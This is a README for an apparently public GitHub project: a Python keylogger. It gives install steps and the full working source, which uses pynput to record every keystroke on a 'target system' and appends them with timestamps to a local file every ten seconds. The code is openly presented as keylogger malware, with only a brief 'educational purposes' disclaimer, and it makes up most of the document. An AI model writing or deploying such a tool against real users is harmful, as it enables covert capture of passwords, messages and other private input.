# Keylogger Tool

## Overview

This keylogger tool captures and stores keystrokes on a target system. It records keystrokes and saves them to a local file (`keystrokes.txt`) for analysis. This tool is intended for educational purposes and should be used responsibly, complying with all applicable laws and regulations.

## Features

- Captures all keystrokes, including special keys (space, enter, tab).
- Logs keystrokes in batches to improve performance.
- Includes timestamps for each batch of keystrokes.
- Writes logs to a local file (`keystrokes.txt`).

## Prerequisites

- Python 3.7+
- `pynput` library

## Installation

1. **Clone the repository**:
    ```bash
    https://github.com/paradoxing57/Key-Logger.git
    cd Key-Logger
    ```

2. **Create and activate a virtual environment** (optional but recommended):
    ```bash
    python -m venv venv
    source venv/bin/activate  # On Windows use `venv\Scripts\activate`
    ```

3. **Install the required libraries**:
    ```bash
    pip install -r requirements.txt
    ```

## Usage

1. **Run the keylogger**:
    ```bash
    python enhanced_keylogger.py
    ```

2. **Stop the keylogger**:
    - The keylogger runs until the script is manually stopped (e.g., using `Ctrl+C` in the terminal).

3. **View the logs**:
    - The keystrokes are saved in `keystrokes.txt` in the same directory as the script.

## Code Explanation

The keylogger script captures keystrokes using the `pynput` library and logs them to a file. It processes keystrokes in batches to improve performance and includes robust error handling.

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

```python
import pynput.keyboard
import threading
from datetime import datetime

log = []
log_buffer_limit = 100  # Adjust the buffer limit as needed

def process_key_press(key):
    global log
    try:
        log.append(key.char)
    except AttributeError:
        if key == key.space:
            log.append(" ")
        elif key == key.enter:
            log.append("\n")
        elif key == key.tab:
            log.append("\t")
        else:
            log.append(f"[{str(key)}]")

def write_to_file():
    global log
    if log:
        with open("keystrokes.txt", "a") as file:
            file.write(f"{datetime.now()} - {''.join(log)}\n")
        log = []

def report():
    global log
    write_to_file()
    timer = threading.Timer(10, report)
    timer.start()

def main():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
    with keyboard_listener:
        report()
        keyboard_listener.join()

if __name__ == "__main__":
    main()
